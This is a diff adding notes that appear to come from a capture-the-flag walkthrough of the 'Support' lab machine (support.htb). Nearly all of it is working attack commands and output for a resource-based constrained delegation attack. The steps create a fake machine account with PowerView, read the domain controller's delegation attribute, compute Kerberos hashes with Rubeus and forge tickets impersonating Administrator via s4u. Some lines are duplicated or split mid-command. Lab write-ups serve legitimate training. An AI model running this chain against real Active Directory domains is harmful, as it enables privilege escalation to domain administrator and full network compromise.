@@ -180,3 +180,42 @@ Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
 
 $RawBytes = Get-DomainComputer DC -Properties 'msds- allowedtoactonbehalfofotheridentity' | select -expand msds-
 allowedtoactonbehalfofotheridentity
+
+. ./PowerView.ps1
+
+New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
+
+$RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+
+$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList
+$RawBytes, 0
+
+$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
+
+*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0
+
+
+[*] Action: Calculate Password Hash(es)
+
+[*] Input password             : Password123
+[*] Input username             : FAKE-COMP01$
+[*] Input domain               : support.htb
+[*] Salt                       : SUPPORT.HTBhostfake-comp01.support.htb
+[*]       rc4_hmac             : 58A478135A93AC3BF058A5EA0E8FDB71
+[*]       aes128_cts_hmac_sha1 : 06C1EABAD3A21C24DF384247BC85C540
+[*]       aes256_cts_hmac_sha1 : FF7BA224B544AA97002B2BEE94EADBA7855EF81A1E05B7EB33D4BCD55807FF53
+[*]       des_cbc_md5          : 5B045E854358687C
+
+Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71
+/impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
+
+Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/DC.support.htb /altservice:cifs /ptt
